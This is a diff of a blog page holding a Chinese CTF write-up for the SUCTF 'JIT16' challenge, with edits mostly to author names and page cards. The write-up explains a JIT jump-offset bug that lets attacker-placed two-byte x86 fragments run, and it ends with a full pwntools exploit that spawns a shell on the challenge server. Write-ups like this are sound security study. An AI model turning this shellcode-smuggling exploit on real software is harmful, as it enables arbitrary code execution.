@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SUctf-JIT16, Hexo">
+    <meta name="keywords" content="SUctf-JIT16, q1ming">
     <meta name="description" content="逆向分析寄存器 : ax, bx, cx, dx
 opcode：
 mov指令opcode &amp;#x3D;&amp;#x3D; 0x00:
@@ -22,7 +22,7 @@ opcode &amp;#x3D;&amp;#x3D; 0x01:
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SUctf-JIT16 | Hexo</title>
+    <title>SUctf-JIT16 | q1ming</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -69,7 +69,7 @@ opcode &amp;#x3D;&amp;#x3D; 0x01:
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Hexo</span>
+                    <span class="logo-span">q1ming</span>
                 </a>
             </div>
             
@@ -173,7 +173,7 @@ opcode &amp;#x3D;&amp;#x3D; 0x01:
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Hexo</div>
+        <div class="logo-name">q1ming</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -430,23 +430,23 @@ opcode &amp;#x3D;&amp;#x3D; 0x01:
 <p>​	je 0x13</p>
 <h3 id="alu指令"><a href="#alu指令" class="headerlink" title="alu指令"></a>alu指令</h3><p>neg 0x41</p>
 <h2 id="漏洞分析-攻击思路"><a href="#漏洞分析-攻击思路" class="headerlink" title="漏洞分析&amp;&amp;攻击思路"></a>漏洞分析&amp;&amp;攻击思路</h2><p>漏洞点出现在jmp指令，开始还感觉很奇怪，直接编译成了一个固定的偏移：</p>
-<p><img src="/images/1736762570653.png" alt="1736762570653"></p>
+<p><img src="/images/1736762570653.png"></p>
 <p>后来仔细观察发现，会在下面这个函数中进行偏移的修正</p>
-<p><img src="/images/1736762587450.png" alt="1736762587450"></p>
+<p><img src="/images/1736762587450.png"></p>
 <p>这里就要注意x86_64汇编中的跳转指令了，当距离在-128~127之间是短跳转指令，只占两个字节，当超过这个距离之后，就要用长跳转指令，其指令长度为5个字节，漏洞就出现在这里：</p>
-<p><img src="/images/1736762604808.png" alt="1736762604808"></p>
+<p><img src="/images/1736762604808.png"></p>
 <p>可以从下图中看到，该函数首先从指令中取出立即数并计算目标地址，如果偏移过大需要长跳转指令，则需要重新修改指令：</p>
-<p><img src="/images/1736762620952.png" alt="1736762620952"></p>
+<p><img src="/images/1736762620952.png"></p>
 <p>新的指令长度如下：</p>
-<p><img src="/images/1736762637115.png" alt="1736762637115"></p>
+<p><img src="/images/1736762637115.png"></p>
 <p>而原来的指令是2，也就是我们当前的指令长度凭空变长了3；</p>
 <p>然后在该函数退出之后，会重新调整每条指令的地址：</p>
-<p><img src="/images/1736762654996.png" alt="1736762654996"></p>
+<p><img src="/images/1736762654996.png"></p>
 <p>也就是在每个指令检查过后（只检查jmp其实）都会调整指令的地址，同时由于跳转指令都是用的偏移地址，因此只要起始地址和目标地址的相对位置不变，就不会出错；但是漏洞还是发生在了一个细微之处，如果此时发生了一个长跳转，那么修改完指令之后，该jmp指令及其之前的指令的地址都是正确的，而其后边的指令地址目前来看都是少了3字节的；那么如果此时继续向后分析，遇到了一个新的跳转指令，那么在分析过程中，包括这个jmp指令在内的、向后的指令的地址都是错误的，而它前面的指令的地址都是正确的，那么如果此时这个指令的偏移是一个负数，也就是向前跳转，就会出现“从一个错误的地址跳转到一个正确的地址”的现象，那么就会发生偏移计算错误、最终跳转目标错误的情况；</p>
 <p>正是利用这个问题，我们可以使得控制流跳转到某条指令的中间部分，而这个指令如果是包含立即数的，我们就可以在立即数中部署一些指令片段，从而使得其执行一些非法的指令；</p>
 <p>由于是16位虚拟机，立即数只有2字节，因此我们的非法指令至多2字节，而由于起初大多数寄存器被清零了，同时r8为mmap的一片不可写的地址，但是通过调试可以发现r8+0x1000是可写的，我们在这里部署&#x2F;bin&#x2F;sh字符串，首先多次利用mov指令在这片内存中写入”&#x2F;bin&#x2F;sh”，然后通过跳转漏洞两次分别构造非法指令push r8，pop rax ，将r8放入rax中，然后利用虚拟机提供的指令使rax自增0x1000指向”&#x2F;bin&#x2F;sh”，然后再次利用跳转漏洞构造非法指令”push rax; pop rdi”（一次就行）；之后继续利用跳转漏洞构造非法指令”xor rax, rax” （没办法，16位虚拟机清空不了）之后利用虚拟机提供的之后将rax赋值为0x3b（系统调用号），最后再利用因此跳转漏洞构造非法指令syscall，最终实现execve(“&#x2F;bin&#x2F;sh”, 0, 0)</p>
-<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/images/1736597103766.png" alt="1736597103766"></p>
-<p><img src="/images/1736597114199.png" alt="1736597114199"></p>
+<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/images/1736597103766.png"></p>
+<p><img src="/images/1736597114199.png"></p>
 <p>SUCTF{Jump_T0_she11c0de_1n_1_byt3_di3Kj43jG1js}</p>
 <h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>import sys<br><br>file = &quot;./pwn&quot;<br>if len(sys.argv) == 1 or sys.argv[1] == &#x27;l&#x27;:<br>    sh = process(file)<br>elif sys.argv[1] == &#x27;r&#x27;:<br>    sh = remote(&quot;1.95.131.201&quot;,  10001)<br>elf = ELF(file)<br><br>def ru(string):<br>    sh.recvuntil(string)<br>def dbg(con=&#x27;&#x27;):<br>    if len(sys.argv) &gt; 1 and sys.argv[1] == &#x27;r&#x27;:<br>        return<br>    if isinstance(con, int):<br>        con = &quot;b *$rebase(&quot; + hex(con)+&quot;)&quot;<br>    gdb.attach(sh, con)<br>    pause()<br>def sl(content):<br>    sh.sendline(content)<br>def itr():<br>    sh.interactive()<br>context.log_level = &#x27;debug&#x27;<br>def get_heap():<br>    res = 0<br>    res = u64(sh.recvuntil(&quot;\x55&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    if res == 0:<br>        res = u64(sh.recvuntil(&quot;\x56&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    return res<br>def get_libc():<br>    res = 0<br>    res = u64(sh.recvuntil(&quot;\x7f&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    if res == 0:<br>        res = u64(sh.recvuntil(&quot;\x7e&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    return res<br>def get_tcache():<br>    res = u64(sh.recvuntil(&quot;\x05&quot;)[-5:].ljust(8, b&quot;\x00&quot;))<br>    return res<br>def jmp(off): #以4字节为单位jmp<br>    return p8(0x50)+p8(0)+p16(off)<br>def je():<br>    return p32(0x51)<br>def mov_imm(reg1, imm):<br>    res = p8(1) + p8(reg1&lt;&lt;4) +p16(imm)<br>    return res<br>def load_w(reg1, reg2):<br>    byte1 = (reg2&amp;0xf) | (reg1 &lt;&lt; 4)<br>    res = p8(0x61) + p8(byte1) + p16(0)<br>    return res<br>def store_w(reg1, reg2):<br>    byte1 = (reg2&amp;0xf) | (reg1 &lt;&lt; 4)<br>    res = p8(0x71) + p8(byte1) + p16(0)<br>    return res<br>def hlt():<br>    return p32(0x90)<br>def clc():<br>    return p32(0x81)<br>def stc():<br>    return p32(0x80)<br>def neg(reg):<br>    return p8(0x41) + p8(reg1&lt;&lt;4) +p16(0)<br>def sub(reg1, reg2):<br>    byte1 = (reg2&amp;0xf) | (reg1 &lt;&lt; 4)<br>    return p8(0x20) + p8(byte1) + p16(0)<br>def je(off):<br>    return p8(0x51)+p8(0)+p16(off)<br>def add(reg1, reg2):<br>    byte1 = (reg2&amp;0xf) | (reg1 &lt;&lt; 4)<br>    return p8(0x10) + p8(byte1) + p16(0)<br>def func():<br>    <br>    ru(&quot;Input ur code:&quot;)<br>    binsh = mov_imm(2, 0x1000) + mov_imm(0, 0x622f) + store_w(2, 0) + mov_imm(0, 0x6e69) + mov_imm(2, 0x1002) + store_w(2, 0)<br>    binsh += mov_imm(0, 0x732f) + mov_imm(2, 0x1004) + store_w(2, 0) + mov_imm(0, 0x0068) + mov_imm(2, 0x1006) + store_w(2, 0)<br>    push_r8 = mov_imm(2, 0x5041*2) + clc() + mov_imm(1, 0x5041) + jmp(0x22) + mov_imm(0, 0x3b)*0x22 + sub(2, 1) + je(4) + jmp(0x10000-0x28) + clc()*3<br>    pop_rax = mov_imm(2, 0x5841*2) + clc() + mov_imm(1, 0x5841) + jmp(0x22) + mov_imm(0, 0x3b)*0x22 + sub(2, 1) + je(4) + jmp(0x10000-0x2a) + clc()*3<br>    add_rax_0x1000 =  mov_imm(2, 0x1000) + add(0, 2) <br>    push_rax_pop_rdi = mov_imm(2, 0x5f50*2) + clc() + mov_imm(1, 0x5f50) + jmp(0x22) + mov_imm(0, 0x3b)*0x22 + sub(2, 1) + je(4) + jmp(0x10000-0x2c) + clc()*3<br>    push_rdx_pop_rax = mov_imm(2, 0x5852*2) + clc()*2 + mov_imm(1, 0x5852) + jmp(0x22) + mov_imm(0, 0x3b)*0x22 + sub(2, 1) + je(4) + jmp(0x10000-0x30) + clc()*3<br>    execve = mov_imm(0, 0x3b) + clc()*2 + mov_imm(1, 0x050f) + jmp(0x22) + clc() + mov_imm(1, 0x050f)*0x23 + jmp(0x10000-0x2f)<br>    <br>    code = binsh + push_r8 + pop_rax + add_rax_0x1000 + push_rax_pop_rdi + push_rdx_pop_rax + execve<br>     <br>    #dbg(0x1F7D )<br>    dbg(0x274D)<br>    sh.send(code)<br><br>    sh.interactive()<br><br>if __name__ == &quot;__main__&quot;:<br>    func()<br><br></code></pre></td></tr></table></figure>
 
@@ -466,7 +466,7 @@ opcode &amp;#x3D;&amp;#x3D; 0x01:
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                    <a href="/about" rel="external nofollow noreferrer">q1ming</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -489,7 +489,7 @@ opcode &amp;#x3D;&amp;#x3D; 0x01:
                     All articles in this blog are used except for special statements
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     reprint policy. If reproduced, please indicate source
-                    <a href="/about" target="_blank">John Doe</a>
+                    <a href="/about" target="_blank">q1ming</a>
                     !
                 </span>
             </div>
@@ -602,6 +602,51 @@ opcode &amp;#x3D;&amp;#x3D; 0x01:
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
+                <a href="/2025/01/14/KEPLER/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="KEPLER">
+                        
+                        <span class="card-title">KEPLER</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-14
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            q1ming
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/paper/">
+                        <span class="chip bg-color">paper</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
                 <a href="/2025/01/14/SU_text/">
                     <div class="card-image">
                         
@@ -618,13 +663,13 @@ opcode &amp;#x3D;&amp;#x3D; 0x01:
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-14
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
@@ -640,43 +685,6 @@ opcode &amp;#x3D;&amp;#x3D; 0x01:
                         <span class="chip bg-color">Heap</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2025/01/14/aboutme/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Hello">
-                        
-                        <span class="card-title">Hello</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-14
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            John Doe
-                            
-                        </span>
-                    </div>
                 </div>
                 
             </div>
@@ -865,7 +873,7 @@ opcode &amp;#x3D;&amp;#x3D; 0x01:
             
                 <span id="year">2019-2025</span>
             
-            <a href="/about" target="_blank">John Doe</a>
+            <a href="/about" target="_blank">q1ming</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             
